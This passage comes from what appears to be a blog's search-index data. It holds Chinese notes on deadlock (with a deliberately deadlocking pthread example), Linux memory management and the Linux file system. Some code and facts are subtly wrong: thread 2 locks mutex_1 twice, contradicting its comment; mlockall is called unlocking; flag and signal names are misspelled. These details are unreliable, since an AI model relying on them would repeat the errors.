不可抢占条件：进程所获得的资源在未使用完毕前不能强行被其他进程夺取； 环路条件：存在一个进程等待序列 0x0a 解决死锁的基本方法为了保证系统的正常运行，应事先采取措施，预防或避免死锁的发生。在系统已出现死锁后，要及时检测到死锁并解除死锁。目前用于处理死锁问题的方法如下： 死锁的预防：采取某种策略，限制并发进程对资源的请求，从而保证死锁的必要条件在系统执行的任何时间都得不到满足； 死锁的避免：在分配资源时，根据资源的使用情况提前做出预测，给定一个合适、安全的进程推进顺序，从而避免死锁的发生； 死锁的检测：允许系统发生死锁。系统设置专用结构应对死锁的发生。当死锁发生时，能够检测到死锁并找出对应的进程和资源； 死锁的解除：与死锁检测配套措施，用于将进程从死锁状态解救出来。 0x0b 产生死锁实例123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109#include &lt;pthread.h&gt;#include &lt;unistd.h&gt;#include &lt;stdio.h&gt;#include &lt;sys/time.h&gt;#include &lt;string.h&gt;#define MAX 10pthread_t thread[2]; //两个线程/* 定义两个锁，给两个线程分别使用 */pthread_mutex_t mutex_0;pthread_mutex_t mutex_1;int number=0;int i;void *thread1()&#123; /* 首先将自己的线程锁 1 上锁，然后访问共享数据 number ，对其进行 + 1 操作，接着不释放线程锁1 而是尝试去获取 线程锁 2 */ printf (&quot;thread[1] : I&#x27;m thread 1\\n&quot;); pthread_mutex_lock(&amp;mutex_0); printf(&quot;thread[1]: mutex_0 already lock!\\n&quot;); number++; printf(&quot;thread[1]: number++--&gt;[%d]\\n&quot;, number); printf(&quot;thread[1]: I will deadlock....\\n&quot;); pthread_mutex_lock(&amp;mutex_1); /* 会在上一步死锁，线程死等在此处 */ printf(&quot;thread1 :主函数在等我完成任务吗？\\n&quot;); pthread_exit(NULL);&#125;void *thread2()&#123; /* 首先将自己的线程锁 2 上锁，确保线程1 在获取线程锁 2 时无限等待（死锁），然后尝试去获取线程锁 1（也被线程 1 上锁，所以还是会无限等待。*/ printf (&quot;thread[2] : I&#x27;m thread 2\\n&quot;); /* 确保线程1 先将锁 1 上锁 */ sleep(1); pthread_mutex_lock(&amp;mutex_1); printf(&quot;thread[2]: mutex_1 already lock!\\n&quot;); number++; printf(&quot;thread[2]: number++--&gt;[%d]\\n&quot;, number); printf(&quot;thread[2]: I will deadlock....\\n&quot;); pthread_mutex_lock(&amp;mutex_1); /* 会在上一步死锁，线程死等在此处 */ printf(&quot;thread2 :主函数在等我完成任务吗？\\n&quot;); pthread_exit(NULL);&#125;void thread_create(void) //创建两个线程&#123; int temp; memset(&amp;thread, 0, sizeof(thread)); //comment1 /*创建线程*/ if((temp = pthread_create(&amp;thread[0], NULL, thread1, NULL)) != 0) //comment2 &#123; printf(&quot;pthread 1 创建失败!\\n&quot;); &#125; else &#123; printf(&quot;pthread 1 被创建\\n&quot;); &#125; if((temp = pthread_create(&amp;thread[1], NULL, thread2, NULL)) != 0) //comment3 &#123; printf(&quot;pthread 2 创建失败\\n&quot;); &#125; else &#123; printf(&quot;pthread 2 被创建\\n&quot;); &#125;&#125;void thread_wait(void)&#123; /*等待线程结束*/ if(thread[0] !=0) &#123; pthread_join(thread[0],NULL); printf(&quot;pthread 1 已经结束\\n&quot;); &#125; if(thread[1] !=0) &#123; //comment5 pthread_join(thread[1],NULL); printf(&quot;pthread 2 已经结束\\n&quot;); &#125;&#125;int main()&#123; /*用默认属性初始化互斥锁*/ pthread_mutex_init(&amp;mutex_0,NULL); pthread_mutex_init(&amp;mutex_1,NULL); printf(&quot;我是主函数哦，我正在创建线程\\n&quot;); thread_create(); printf(&quot;我是主函数哦，我正在等待线程完成任务\\n&quot;); thread_wait(); return 0;&#125;","tags":[{"name":"Linux","slug":"Linux","permalink":"http://example.com/tags/Linux/"},{"name":"内核","slug":"内核","permalink":"http://example.com/tags/%E5%86%85%E6%A0%B8/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Linux","slug":"A-OS/Linux","permalink":"http://example.com/categories/A-OS/Linux/"},{"name":"Linux操作系统原理剖析","slug":"A-OS/Linux/Linux操作系统原理剖析","permalink":"http://example.com/categories/A-OS/Linux/Linux%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86%E5%89%96%E6%9E%90/"}]},{"title":"【原理剖析】a-Linux 内存管理","date":"2023-12-26T16:00:00.000Z","path":"A_OS/Linux/Linux操作系统原理剖析/a-Linux 内存管理/","text":"概述：主要讲述 Linux 操作系统中的内存管理方式及存储器管理的基本概念及原理，从中说明 Linux 操作系统对内存的管理模式以及在 Linux 操作系统中运行的进程的内存管理情况和内存读取、调用的最底层实现方式 Linux 分页管理机制 虚拟内存段的组织与管理 内存的共享和保护 内存空间管理 空闲内存管理 内核态内存的申请与释放 用户态内存的申请与释放 Linux 系统交换空间 存储管理系统的缓冲机制 0x01 Linux分页管理机制Linux 采用“按需调页”算法，支持三层管理策略。由于 Intel CPU 在硬件级提供了段式存储管理和二层页式存储管理功能，Linux 操作系统作为一种软件，必须与之兼容。Linux 根据 Intel 处理器的要求，最低限度地设置与段相关的结构和初始化程序，但实质上是放弃了段式存储管理。Intel 微型计算机上的 Linux 系统考虑到 CPU 的限制，将第二层的页式管理（pmd）与第一层的页式管理（pgd）合并，因此真正发挥作用的是以页目录和页表为中心的数据结构和函数。 在 Linux 中，每个用户进程都可以访问 4GB 的线性虚拟内存空间。其中，03GB 的虚拟地址空间是用户空间，用户进程可以直接对其进行访问；3GB4GB 的虚拟内存地址空间为内核态空间，存放仅供内核态访问的代码和数据，用户态进程不可访问。当用户进程通过中断或系统调用访问内核态空间时，就会触发处理特权级转换，即从操作系统的用户态转换到内核态。 Linux的虚拟地址空间范围为0～4G，Linux内核将这4G字节的空间分为两部分， 将最高的1G字节（从虚拟地址0xC0000000到0xFFFFFFFF）供内核使用，称为“内核空间”。而将较低的3G字节（从虚拟地址0x00000000到0xBFFFFFFF）供各个进程使用，称为“用户空间。因为每个进程可以通过系统调用进入内核，因此，Linux内核由系统内的所有进程共享。于是，从具体进程的角度来看，每个进程可以拥有4G字节的虚拟空间。 所有进程从 3GB 到 4GB 的虚拟空间是一样的，有相同的页目录项和页表，对应相同的物理内存段。Linux 以此方式使得内核态进程共享代码段和数据段。 内核态虚拟空间从 3GB 到 3GB+4MB 的一段被映射到物理空间 04MB。因此，进程处于内核态时，只要通过虚拟空间 3GB3GB+4MB 段即可访问物理空间 0~4MB 段。 既然对于用户空间来说访问的内存地址都是连续的 4GB 线性虚拟地址，那么就需要知道 Linux 是如何划分虚拟空间。Linux 采用“按需调页”技术管理虚拟内存。标准 Linux 的虚拟页表分为三级页表，依次为页目录（PGD Page Directory）、中间页目录（PMD Page Middle Directory）和页表（PTE PageTable），如下图所示： 在 Intel CPU 上，Linux 的页表结构实际上为两级。IA-32 体系结构的页管理机制中的页目录是 PGD，页表是 PTE，而 PGD 和 PMD 实际上合二为一。在用户进程中用到的与内存管理有关的数据结构是 mm_struct 结构，此结构中包含了用户进程中与存储有关的信息，具体结构定义如下： 12345678910111213141516171819202122struct mm_struct&#123; struct vm_area_struct * mmap; /* 指向虚拟区间（VMA）链表 */ rb_root_t mm_rb; ／*指向red_black树*/ struct vm_area_struct * mmap_cache; /* 指向最近找到的虚拟区间*/ pgd_t * pgd; ／*指向进程的页目录*/ atomic_t mm_users; /* 用户空间中的有多少用户*/ atomic_t mm_count; /* 对&quot;struct mm_struct&quot;有多少引用*/ int map_count; /* 虚拟区间的个数*/ struct rw_semaphore mmap_sem; spinlock_t page_table_lock; /* 保护任务页表和 mm-&gt;rss */ struct list_head mmlist; /*所有活动（active）mm的链表 */ unsigned long start_code, end_code, start_data, end_data; /*start_code 代码段起始地址,end_code 代码段结束地址,start_data 数据段起始地址, start_end 数据段结束地址*/ unsigned long start_brk, brk, start_stack; /*start_brk 和brk记录有关堆的信息, start_brk是用户虚拟地址空间初始化时，堆的结束地址, brk 是当前堆的结束地址, start_stack 是栈的起始地址*/ unsigned long arg_start, arg_end, env_start, env_end; /*arg_start 参数段的起始地址, arg_end 参数段的结束地址, env_start 环境段的起始地址, env_end 环境段的结束地址*/ unsigned long rss, total_vm, locked_vm; unsigned long def_flags; unsigned long cpu_vm_mask; unsigned long swap_address; unsigned dumpable:1; mm_context_t context; /* Architecture-specific MM context, 是与平台相关的一个结构，对i386 几乎用处不大*/&#125;; 每一个进程都有一个页目录，存储该进程所使用的内存页面情况。Linux 按照“按需调页”的原则，只分配必需的内存页面，从而避免了页表过多占用存储空间的情况出现。例如，系统调用 fork 分配内存页面的情况如下： 内核态堆栈 1 页； 页目录 1 页； 页表几页； 而系统调用 exec 分配内存页面的情况则： 可执行文件的文件头 1 页； 用户堆栈 1 页或几页； 这样，当进程开始运行时，如果执行代码不在内存中，将产生第一次缺页中断，让操作系统分配内存页面，并将执行代码装入内存中。此后，按需要逐渐分配更多的内存页面，并参与页面调度。当系统内存不足时，由操作系统决定是否将该进程的一部分页面换出到磁盘交换区或交换文件中。进程终止时，操作系统释放所有该进程占用的资源，包括内存页面。 0x02 虚拟内存段的组织与管理用户程序总共拥有 4GB 的虚拟空间，但是并不是 4GB 空间都可以让用户进程读写或申请使用。用户进程实际上可以申请的虚拟空间为 0 ~ 3GB 。在用户进程创建时，已由系统调用 fork() 的执行函数 do_fork() 将内核的代码段和数据段映射到 3GB 以后的虚拟空间，供内核态进程访问。所有进程的 3GB~4GB 的虚拟控件的映像都是相同的，并以此方式共享代码段和数据段。 为了能够以自然的方式管理进程虚拟控件，Linux 定义了虚拟段（vma virtual memory area），一个 vma 段是某个进程的一段连续的虚拟控件，在这段虚拟空间的所有单元拥有相同的特征。例如，属于同一个进程具有相同的访问权限，将同时被锁定、受保护等。 虚拟段的数据结构如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950struct vm_area_struct &#123; /* 第一个缓存行具有VMA树移动的信息*/ unsigned long vm_start; /* Our start address within vm_mm. */ unsigned long vm_end; /* The first byte after our end address within vm_mm. */ struct vm_area_struct *vm_next, *vm_prev; /* 每个任务的VM区域的链接列表，按地址排序*/ struct rb_node vm_rb; /* 此VMA左侧最大的可用内存间隙（以字节为单位）。 在此VMA和vma-&gt; vm_prev之间， 或者在VMA rbtree中我们下面的一个VMA与其-&gt;vm_prev之间。 这有助于get_unmapped_area找到合适大小的空闲区域。 */ unsigned long rb_subtree_gap; /* 第二个缓存行从这里开始*/ struct mm_struct *vm_mm; /* 我们所属的address space*/ pgprot_t vm_page_prot; /* 此VMA的访问权限 */ unsigned long vm_flags; /* Flags, see mm.h. */ /* 对于具有地址空间（address apace）和后备存储(backing store)的区域， 链接到address_space-&gt;i_mmap间隔树，或者链接到address_space-&gt; i_mmap_nonlinear列表中的vma。 */ union &#123; struct &#123; struct rb_node rb; unsigned long rb_subtree_last; &#125; linear; struct list_head nonlinear; &#125; shared; /* 在其中一个文件页面的COW之后，文件的MAP_PRIVATE vma可以在i_mmap树和anon_vma列表中。 MAP_SHARED vma只能位于i_mmap树中。 匿名MAP_PRIVATE，堆栈或brk vma（带有NULL文件）只能位于anon_vma列表中。 */ struct list_head anon_vma_chain; /* 由mmap_sem和* page_table_lock序列化*/ struct anon_vma *anon_vma; /* Serialized by page_table_lock 由page_table_lock序列化*/ const struct vm_operations_struct *vm_ops; /* 用于处理此结构体的函数指针 */ /* 后备存储（backing store）的信息: */ unsigned long vm_pgoff; /* 以PAGE_SIZE为单位的偏移量（在vm_file中），*不是* PAGE_CACHE_SIZE*/ struct file * vm_file; /* 我们映射到文件（可以为NULL）*/ void * vm_private_data; /* 是vm_pte（共享内存） */&#125;; 结合前面的内存管理数据结构，可以绘制如下的 Linux 内存管理框图： 0x03 内存的共享和保护Linux 中内存共享以页表的形式实现，共享该页的各进程的页表表项直接指向共享页，如下图所示。这种结构不需要设立共享页表，节约内存的占用，但是效率较低。当共享页状态发生变化时，共享该页的各进程的页表均需要修改，并要多次访问页表。 Linux 可以对虚拟段中的任意部分加锁或保护。对进程的虚拟地址加锁，其实质就是对 vma 段的 vm_flags 属性与 VM_LOCKED(0X2000) 进行“或”操作，虚拟内存加锁后，它对应的物理页面驻留内存不再被页面置换程序换出。加锁操作有三种： Mlock：对指定的一段虚拟空间加锁； Munlock：对指定的一段虚拟空间解锁； Mlockall：对进程的所有虚拟空间解锁； 对进程的虚拟地址施行地址保护措施就是重新设置 vma 段的访问权限，其实质就是对 vma 段的 vm_flags 属性重置 PORT_READ(0X1) 、PORT_WRITE(0X2)、PROT_EXEC(0X4)，重新设定 vm_page_port 属性，与此同时，对虚拟地址范围内的所有页表项，其访问权限也相应调整，保护操作由系统调用 mprotect 实施。 虚拟段加锁、保护操作可以有以下几种方式： 对整个虚拟段加锁或保护 对虚拟段前部加锁或保护 对虚拟段后部加锁或保护 对虚拟段中部加锁或保护 0x04 内存空间管理尽管 Linux 采用虚拟存储管理策略，有些申请仍然需要直接分配物理空间。例如，为刚创建的进程分配页目录，为装入进程的代码段分配空间，为 I&#x2F;O 操作准备缓冲区等。物理内存以页帧为单位，页帧的长度固定，等于页长，对于 Intel CPU 默认为 4KB。 Linux 对物理内存的管理通过 mem_map 表描述。mem_map 在系统初始化时，由 free_area_init() 函数创建，如下图所示： 0x05 空闲内存管理在物理内存低端，紧跟 mem_map 表的 bitmap 表以位示图方式记录了有有物理内存的空闲情况。与 mem_map 一样，bitmap 表在系统初始化时由 free_area_init() 函数创建，如下图所示： 0x06 内核态的内存的申请与释放内核态内存是用来存放 Linux 内核系统数据结构的内存区域，处于进程虚拟空间的 3GB~4GB 范围内。以 Intel CPU 为例，申请的内存块大小 blocksize 有 32、64、128、512 等。在 blocksize 中能够申请到的块的大小近似于 2 的次幂，所差的恰好是管理数据结构所占用的字节数，如 16 是 struct page_dsecriptor 结构的长度。 管理内核空间空闲块的数据结构及相互关系如下图所示： 0x07 用户态内存的申请与释放Linux 用 kmalloc() 函数和 kfree() 函数提供内核内存申请、释放的接口，它还实现另一种虚拟空间的申请、释放接口，就是 vmalloc() 和 vfree()。 由 vmalloc() 分配的存储空间在进程的虚拟空间是连续的，当它对应的物理内存扔需要经过缺页中断后由缺页中断服务程序分配，所分配的物理页帧不是连续的。这些特征和访问用户内存相似，所以&#x3D;&#x3D;不妨把 vmalloc() 和 vfree() 成为用户态内存的申请和释放界面&#x3D;&#x3D;。 可分配的虚拟空间在 3GB+high_memory+HOLE_8MB 以上的高端，由 vmlist 链表管理。3GB 是内核态赖以访问物理内存的起始地址。high_memory 是安装在计算机中实际可用的物理内存的最高地址。 因此 3GB+high_memory 也是物理内存的上界。 HOLE_8MB 则是长度为 8MB 的“隔离带”，起越界保护作用。这样，vmlist管辖的虚拟空间既不与进程用户态0~3GB的虚拟空间冲突，也不与进程内核态映射的 3GB~3GB+high_memory 的虚拟空间冲突。 vmlist链表的节点类型 vm_struct 具体内容如下： 123456struct vm_struct&#123; unsigned long flags; /* 虚拟内存块的占用标志 */ void *addr; /* 虚拟内存块的起始地址 */ unsigned long size; /* 虚拟内存块的长度 */ struct vm_struct *next; /* 下一个虚拟内存块 */&#125;; 起始时，vmlist 只有一个节点，vmlist_addr 置为 VMALLOC_START（段地址 3GB，偏移量 high_memory+8MB）。动态管理过程中，vmlist 的虚拟内存块按起始地址从小到大排序，每个虚拟内存块之后都有一个 4KB 大小的“隔离带”，用来检查指针的越界错误，用户申请大块连续空间可用 vmalloc() ，如下图所示： 0x08 交换空间计算机的物理内存空间总是影响机器性能。内存太小时，操作系统采用交换的方式。1970 年以后，按需调页算法得到了应用，是 Linux 操作系统采用的虚拟存储器的策略。换页操作时，Linux 区分两种不同的内存数据。一部分没有写权限的进程空间在换页时无需存入交换空间，直接丢弃即可。那些修改过的页面，换页时，其内容必须保存，保存的位置属于交换空间的某个页面。 Linux 采用两种方式保存换出的页面，一种是整个块设备，如磁盘的一个分区，称为交换设备；另一种是文件系统的固定长度的文件，称为交换文件。交换设备和交换文件统称为交换空间。 尽管交换空间有两种不同的方式，当它们的内部格式是一致的。一个交换空间最多可容纳 32687 个页面。如果一个交换空间不够用，Linux 允许并行管理多个交换空间，交换设备远比交换文件有效。在交换设备中，属于同一个页面的数据块总是连续的，第一个数据块地址确定，后续的数据库可以按顺序读出或写入，而在交换文件中，属于同一个页面的数据块虽然在逻辑上是连续的，但是数据块的实际位置可能是零散的。 当交换进程 kswapd 尝试换出页面时，调用测试进程 try_to_swap_out() 测试页面的存在时间。如果某个物理页面可以换出，则调用 get_swap_page() 申请交换空间的页面，得到交换进程的入口地址 entry，将要换出的物理页面换到 entry 指定的交换空间的某个页面中。 0x09 页交换进程与页面交换当物理页面不够时，Linux 存储管理系统必须释放部分物理页面，将它们的内容写到交换空间。实现这个功能的就是内核态交换程序 kswwapd。 kswapd 属于一种特殊的进程，成为内核态进程。Linux 的内核态进程没有虚拟存储空间进程，它们运行在内核态，直接使用物理地址空间。它不仅能够将页面换出交换空间，而且保证系统中有足够的空闲页面，保证存储系统高效运行。 kswapd 在系统初始启动时由内核态进程 init 创建，其初始化程序段以调用 init_swap_timer() 函数结束，进而转入 while(1) 循环，并马上睡眠。 内核交换进程依照 3 种方式缩减系统使用的物理页面， page cache和buffer cache 换出 SYSTEM V 共享内存占用的页面 换出或丢弃进程占用的页面 0x0a 缺页中断和页面交换磁盘中的可执行文件映像 Image 一旦被映射到一个进程的虚拟空间就可以开始执行。由于只有该映像区的开始部分调入内存，因此，进程迟早会执行到那些尚未调入内存的代码。当一个进程访问了一个还没有有效页表项的虚拟地址时（即页表项的 P 位为 0），处理器将产生缺页中断，通知操作系统，并将出现缺页的虚拟地址（在 CR2 寄存器中）和缺页时访问虚拟内存的模式，并传递给 Linux 的缺页中断服务程序。 在系统初始化时，设定了缺页中断服务程序为 do_page_fault() ： 1234Set_ttrap_gate(14, &amp;page_fault);ENTRY(page_fault)pushI$SYMBOL_NAME(do_page_fault)jmp error_code /* 异常中断服务程序统一入口 */ 根据控制寄存器 CR2 传递的缺页地址，Linux 必须找到用来表示缺页的虚拟存储区的 vm_area_struct 结构。在搜索进程的 vm_area_struct 结构时，对搜索时间应有严格的限制。为了有效地处理搜索工作，Linux 将所有的 vm_area_struct 结构通过 AVL 平衡树连接起来。如果没用找到与缺页相对应的 vm_area_struct 结构，那么说明进程访问了一个非法存储器，Linux 向进程发送信号 GIGSEGV ，如果进程没用处理该信号的函数，该进程将被终止。 Linux 接着检测缺页时访问模式是否合法。如果进程对该页的访问超越权限，例如试图对只允许读操作的页面进行写操作，系统也将向该进程发送一个信号，通知进程的存储访问出错。经过以上两步检查，可以确定肯定是正常的缺页中断。 Linux 还区分产生缺页中断的页面是在交换空间，还是在磁盘中作为某一可执行文件映像的一部分，进而做出不同的处理，这一点通过页表项中的位来区分。如果该页面所对应的页表项是无效的（p=0），但是非空，说明缺页在交换空间中。否则，页面是某一个可执行文件映像（image）的一部分。 并不是所有的 vm_area_struct 结构变量都有完整的一套虚拟存储操作，有些甚至没有 nopage 操作函数指针。在这种情况下，Linux 将使用缺省的操作函数为该虚拟页面找到物理页帧，同时为其设置一页表项。如果 vm_area_struct 结构变量中有 nopage 操作函数，Linux 使用该操作函数。 Linux 的 nopage 函数通常用来调入已被存储映射的可执行磁盘映像，而且它是利用 page cache 来将所需映像页调入内存的。 0x0b 存储管理系统的缓冲机制存储管理系统的缓冲机制主要包括 kmalloc cache、swap cache 和 page cache Kmalloc cache 在 “内核态内存的申请与释放”已做了介绍，本节介绍另外两种 cache Swap cache 如果以前被调出到交换空间的页面由于进程再次访问而调入物理内存，只要该页调入后没有被修改过，那么它的内容与交换空间中的内容是一样的。在这种情况下，交换空间中的备份还是有效的。因此在该页再度换出时，就没必要执行写操作。Linux 采用 swap_cache 表描述的 swap cache 来实现这种思想。swap cache 实质上是关于页表项的一个列表，swap_cache 表位于 mem_map 表之前。 每一物理页面都在 swap cache 中占有一表项，swap_cache 表项的总数就是物理页面总数，若该物理页面的内容是新创建的，或虽然曾经换出过，但换出后，该物理页面已经被修改时，则该表项清零。内容非零的表现，正好是某个进程的页表项，描述了页面在交换空间中的位置。 当 Linux 将一物理页面调出到交换空间时，它先查询 swap cache ，如果其中有与该页面对应的有效页表项，那就不需要将该页写出，因为原交换空间中的内容与待换出的页面内容是一致的。 Page Cache Linux 的 page cache 的作用是加快对磁盘的访问速度，文件被映射到内存中，每次读取一页，而这些页就保存于 page cache 中。 每当需要读取文件的一页时，总是首先通过 page cache 读取。如果所需页面在 page cache 中，就返回指向表示该页面的 mem-map-1的指针。否则必须从文件系统中调入。接着，Linux 申请一物理页，将该页从磁盘文件中调入内存。 如果有可能的话，Linux 还发出读取当前页面后一个页面的读操作请求。这种预读一页的思想来自局部原理，即在进程读当前页时，它的后一页也可能被进程用到。 随着越来越多的文件页面被读取、执行，page cache 将会变得越来越大。进程不再需要的页面应从 page cache 中删除。当 Linux 在使用内存过程中发现屋里页面渐变稀少时，将缩减 page cache。","tags":[{"name":"Linux","slug":"Linux","permalink":"http://example.com/tags/Linux/"},{"name":"内核","slug":"内核","permalink":"http://example.com/tags/%E5%86%85%E6%A0%B8/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Linux","slug":"A-OS/Linux","permalink":"http://example.com/categories/A-OS/Linux/"},{"name":"Linux操作系统原理剖析","slug":"A-OS/Linux/Linux操作系统原理剖析","permalink":"http://example.com/categories/A-OS/Linux/Linux%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86%E5%89%96%E6%9E%90/"}]},{"title":"【原理剖析】b-Linux 系统文件管理","date":"2023-12-26T16:00:00.000Z","path":"A_OS/Linux/Linux操作系统原理剖析/b-Linux 系统文件管理/","text":"概述：从逻辑结构上看，Linux 系统中的文件是没有结构的流式文件。从物理结构上看，Linux 采用混合多重索引结构，即将文件所占用磁盘的盘块号直接或间接存放在该文件索引节点的地址项中。在查找文件时只要找到该文件的索引节点就可以用直接或间接的寻址方式获得指定文件的盘块号。 Linux 文件的物理结构 Linux 文件系统 Linux 文件目录管理命令 Linux 操作系统下的软链接和硬链接 0x01 Linux文件的屋里结构在 Linux 中根据文件的大小，形成小型、中型、大型和巨型等不同规模的文件，如下图所示： 0x02 寻址方式 直接寻址方式 Linux 系统为了提高对文件的检索速度，采用直接寻址方式。在索引节点中建立 12 个地址项，用来直接存放该文件所在的盘块号，对应的盘块称为直接块。 一次间接寻址方式 当文件较大时，Linux 系统提供了一次间接寻址方式。在这种寻址方式中，一次间接地址项中所对应的盘块（间接块）存放的不是文件所在的物理盘块号，而是直接块的块号表。为了通过间接块读取文件数据，需要先读取间接块找到对应的直接块项，然后从直接块中读取数据。 多次间接寻址方式 对于大型或巨型的文件，Linux 系统又引入了二次间接寻址和三次间接寻址。二次间接项中存放的是一次间接块号表，三次间接项对应的盘块中放有二次间接块号表。 0x03 地址转换Linux 系统利用地址转换过程将逻辑文件中的字节偏移量转换成文件的物理块号。首先，将字节偏移量转换成文件逻辑块号及块内偏移量，然后将逻辑块号转换成物理块号。 直接地址 当文件逻辑盘块号小于 12 时，将逻辑块号转换成物理块号的方法是将文件逻辑块号转换为索引节点的地址项下标，然后从该地址项中就可以直接获得该文件的物理盘块号。 间接地址 当计算出的文件逻辑块号大于或等于 12 而小于 268 时，采用一次间接地址方式。将逻辑块号转换为物理块号的方法是从一次间接项中得到一级间接的盘块号，根据该间接块的内容计算一次间接块中的地址下标，即将文件的逻辑块号减去 12 ，从相应下标的地址项中得到物理块号。 0x04 Linux文件系统和普通 Unix 系统意义，Linux 使用树状的文件系统。每个系统都有一个根目录，从这里开始可以遍历整个系统中的所有文件，Linux 文件系统中没有类似 Windows 系统中的驱动器和盘符的概念。 0x05 Linux文件类型Linux 系统下的文件类型主要有： 普通文件：C 语言元代码、SHELL 脚本、二进制的可执行文件等。分为纯文本和二进制。 目录文件：目录，存储文件的唯一地方。 链接文件：指向同一个文件或目录的的文件。 特殊文件：与系统外设相关的，通常在&#x2F;dev 下面。分为块设备和字符设备。 在 Linux 系统下可以在终端使用 ls –l、file、stat 几个命令来查看文件的类型等相关信息。如下图所示： 0x06 Linux 文件存储结构Linux 正统的文件系统(如 ext2、ext3)一个文件由目录项、inode 和数据块组成。 目录项：包括文件名和 inode 节点号。 inode：又称文件索引节点，是文件基本信息的存放地和数据块指针存放地。 数据块：文件的具体内容存放地。 Linux 正统的文件系统(如 ext2、ext3 等)将硬盘分区时会划分出目录块、inode Table 区块和 data block 数据区域。一个文件由一个目录项、inode 和数据区域块组成。Inode 包含文件的属性(如读写属性、owner等，以及指向数据块的指针)，数据区域块则是文件内容。当查看某个文件时，会先从 inode table 中查出文件属性及数据存放点，再从数据块中读取数据。 如下图所示： 其中目录项的结构如下(每个文件的目录项存储在改文件所属目录的文件内容里)，如下图所示： 其中文件的 inode 结构如下（inode 里所包含的文件信息可以通过 stat filename 查看得到）： 以上只反映大体的结构，linux 文件系统本身在不断发展。但是以上概念基本是不变的。且如 ext2、ext3、ext4 文件系统也存在很大差别，如果要了解可以查看专门的文件系统介绍。 0x07 软连接、硬链接软链接和硬链接是我们常见的两种概念： 硬链接：是给文件一个副本，同时建立两者之间的链接关系。修改其中一个，与其链接的文件同时被修改。如果删除其中 [color&#x3D;red] 任意一个 [&#x2F;color] 其余的文件将不受影响。 软链接:也叫符号链接,他只是对源文件在新的位置建立一个“快捷方式（借用一下 wondows 常用词）”，所以，当源文件删除时，符号链接的文件将成为无源之水-&gt;仅仅剩下个文件名了，当然删除这个链接，也不会影响到源文件，但对链接文件的使用、引用都是直接调用源文件的。 具体关系可以看下图： 从图上可以看出硬链接和软链接的区别： 硬链接原文件和新文件的 inode 编号一致。而软链接不一样。 对原文件删除，会导致软链接不可用，而硬链接不受影响。 对原文件的修改，软、硬链接文件内容也一样的修改，因为都是指向同一个文件内容的。 0x08 Linux文件目录管理磁盘和文件空间使用命令： dd：把指定的输入文件复制到指定的输出文件中，并且在复制过程中进行格式转换。 fdisk：创建和维护分区表的程序，它兼容 DOS 类型的分区表、BSD 或者 SUN 类型的磁盘列表。 df：可以显示所有文件系统对 i 节点和磁盘块的使用情况 du：该命令逐级进入指定目录的每一个子目录并显示该目录占用文件系统数据块( 1024 字节)的情况。 文件目录与管理使用命令： cd：改变当前工作目录 pwd：显示当前工作目录的全路径名 mkdir：创建目录 rmdir：删除目录 ls：用于显示目录内容，类似 DOS 下的 dir 命令，它的使用权限是所有用户 cp：带目录复制 rm：删除文件或目录 mv：目录更名或搬移 查看文件内容命令： cat: cat [file] 查看文件的内容。全称是 concatenate 的意思，将文件内容连续输出到屏幕上。第一行到最后一行显示。 tac: tac [file] 和 cat 刚好相反 是从最后一行到第一行的方式查看。 cat 有个比较不好的地方时当文件比较大时候没办法看清楚，这个时候可以用 more 或者 Less 命令。 more: more [file] 如果使用 grep 或者 find 等命令时，可以配合使用 more 一页一页的查看。如果看到一半想退出，则敲入’q’即可退出。 less: less [file] less比 more 更有弹性，可以上下翻页。 如果只想读取文件的头几行或者文件的末尾几行，可以用 head 或 tail. head –n [file]：读取文件的前 n 行。 tail –n [file]：读取文件末尾 n 行。 以上命令都是用于查看字符文件，二进制文件出来的都是乱码，要看二进制文件的内容，可以用 od 命令,如查看一个 MP3 文件里面的内容: od shijiemori.mp3 文件目录与权限命令： chmod：修改文件或目录的存取权限 chown：改变文件拥有者 chgrp：改变文件的所属组 umask：用来设定[权限掩码]。[权限掩码]是由 3 个八进制的数字所组成，将现有的存取权限减掉权限掩码后，即可产生建立文件时预设的权限。 文件查找命令： which: which [filename] 该命令用于查询通过 PATH 路径到该路径内查找可执行文件。如：Which passwd:查找可执行文件 passwd whereis: whereis [-bmsu] [keyword] 该命令用于把相关字的文件和目录都列出来。(Linux 会将文件都记录在一个文件数据库里面，该命令式从数据库去查询，所以速度比较快,Linux 每天会更新该数据库) locate: locate [filename] 该命令用于把相关字的文件和目录都列出来。查找数据特别快，也是通过数据库方式来查询。但是数据库一周更新一次，所以可能有些存在数据查不到。可以去修改配置文件。 find: find [path] [参数] [keyword] 该命令用于在指定路径下查找文件。不是通过数据来查询，所以速度会比较慢。 0x09 Linux文件系统常见目录描述Linux 各种发行版的目录结构基本一致，各个目录简单介绍如下： 目录 描述 &#x2F; 根目录 &#x2F;bin 做为基础系统所需要的最基础的命令就是放在这里。比如 ls、cp、mkdir 等命令；功能和&#x2F;usr&#x2F;bin 类似，这个目录中的文件都是可执行的，普通用户都可以使用的命令。 &#x2F;boot Linux 的内核及引导系统程序所需要的文件，比如 vmlinuz initrd.img 文件都位于这个目录中。在一般情况下，GRUB 或 LILO 系统引导管理器也位于这个目录；启动装载文件存放位置，如 kernels,initrd,grub。一般是一个独立的分区。 &#x2F;dev 一些必要的设备,声卡、磁盘等。还有如 &#x2F;dev&#x2F;null. &#x2F;dev&#x2F;console &#x2F;dev&#x2F;zero &#x2F;dev&#x2F;full 等。 &#x2F;etc 系统的配置文件存放地. 一些服务器的配置文件也在这里；比如用户帐号及密码配置文件；&#x2F;etc&#x2F;opt:&#x2F;opt 对应的配置文件；&#x2F;etc&#x2F;X11:Xwindows 系统配置文件；&#x2F;etc&#x2F;xml:XML 配置文件；…… &#x2F;home 用户工作目录，和个人配置文件，如个人环境变量等，所有的账号分配一个工作目录。一般是一个独立的分区。 &#x2F;lib 库文件存放地。bin 和 sbin 需要的库文件。类似 windows 的 DLL。 &#x2F;media 可拆卸的媒介挂载点，如 CD-ROMs、移动硬盘、U 盘，系统默认会挂载到这里来。 &#x2F;mnt 临时挂载文件系统。这个目录一般是用于存放挂载储存设备的挂载目录的，比如有 cdrom 等目录。可以参看 